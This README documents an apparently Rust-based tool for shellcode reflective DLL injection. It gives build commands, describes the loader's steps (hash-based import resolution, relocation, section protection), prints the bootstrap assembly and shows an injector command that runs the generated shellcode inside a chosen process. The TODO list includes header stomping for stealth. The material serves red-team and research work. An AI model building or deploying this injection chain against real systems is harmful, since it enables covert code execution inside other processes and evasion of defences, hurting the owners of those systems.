# Shellcode Reflective DLL Injection (sRDI)

Development in progress

## What is it?

Shellcode reflective DLL injection (sRDI) is a process injection technique that allows us to convert a given DLL into a position-independent shellcode which can then be injected using our favorite shellcode injection and execution technique.

## Usage

1. Build `testdll` project (feel free to modify the payload from `MessageBoxA` to whatever you want)
```
cd .\testdll\
cargo build
```

2. Build `reflective_loader` project. The loader will emulate `LoadLibraryA` and do additional things:

* Load required modules and exports by hash
* Allocate memory and copy DOS / NT headers and sections into the newly allocated memory (`VirtualAlloc` uses `RW` not `RWX`)
* Process image relocations (rebase image)
* Process image import table (resolve imports)
* Set protection for each section (`VirtualProtect` uses only what is necessary)
* Execute `DllMain` AND `USER_FUNCTION` (export address is retrieved via hash)

```
cd .\reflective_loader\
cargo build
```

3. Run `generate_shellcode` project. This will generate a `shellcode.bin` file that looks like this in memory:

```
-----------------------
| Bootstrap Shellcode |
-----------------------
| Reflective DLL      |
-----------------------
| User DLL            |
-----------------------
| User Data           |
-----------------------
```

This is the bootstrap shellcode that does the magic by passing the parameters and calling the reflective loader

```asm
call 0x00
pop rcx
mov r8, rcx

push rsi
mov rsi, rsp
and rsp, 0x0FFFFFFFFFFFFFFF0
sub rsp, 0x30

mov qword ptr [rsp + 0x20], rcx
sub qword ptr [rsp + 0x20], 0x5

mov dword ptr [rsp + 0x28], <flags>

mov r9, <length of user data>
add r8, <user function offset> + <length of DLL>
mov edx, <hash of function>
add rcx, <offset of dll>

call <reflective loader address>

nop
nop
nop
nop

mov rsp, rsi
pop rsi
ret

nop
nop
nop
nop
nop
nop
nop
nop
```

```
cd .\generate_shellcode\
cargo run
```

4. Build `inject` or bring your own injector and inject `shellcode.bin` with your favorite shellcode injection and execution technique.

```
cd .\inject\
cargo build
```

```
inject.exe <process> <shellcode.bin>
```

## TODO
* Stomp / erase DOS and NT headers
* Free shellcode memory and exit thread (This can be done by the user)
* x86 support (mostly already done)

## References and Credits

* https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/
* https://github.com/monoxgas/sRDI
* https://github.com/stephenfewer/ReflectiveDLLInjection/
* https://discord.com/invite/rust-lang-community (Rust Community #windows-dev channel)
* https://github.com/dismantl/ImprovedReflectiveDLLInjection
* https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html
* https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/
* https://github.com/Cracked5pider/KaynLdr
* https://github.com/Ben-Lichtman/reloader/
* https://github.com/not-matthias/mmap/
* https://github.com/memN0ps/mmapper-rs
* https://github.com/2vg/blackcat-rs/tree/master/crate/mini-sRDI
* https://github.com/Jaxii/idk-rs/
* https://github.com/janoglezcampos/rust_syscalls/